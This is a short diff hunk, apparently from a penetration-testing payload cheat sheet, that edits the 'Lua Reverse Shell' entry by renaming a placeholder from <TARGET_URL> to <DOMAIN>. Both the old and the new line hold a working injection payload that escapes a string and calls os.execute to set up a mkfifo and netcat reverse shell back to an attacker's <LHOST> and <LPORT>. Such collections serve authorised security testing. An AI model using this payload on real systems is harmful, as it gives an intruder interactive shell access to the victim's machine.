@@ -239,7 +239,7 @@ $ print new java.lang.String(new java.io.BufferedReader(new java.io.InputStreamR
 ## Lua Reverse Shell
 
 ```c
-http://<TARGET_URL>');os.execute("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <LHOST> <LPORT>/tmp/f")--
+http://<DOMAIN>');os.execute("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <LHOST> <LPORT>/tmp/f")--
 ```
 
 ## LNK Files
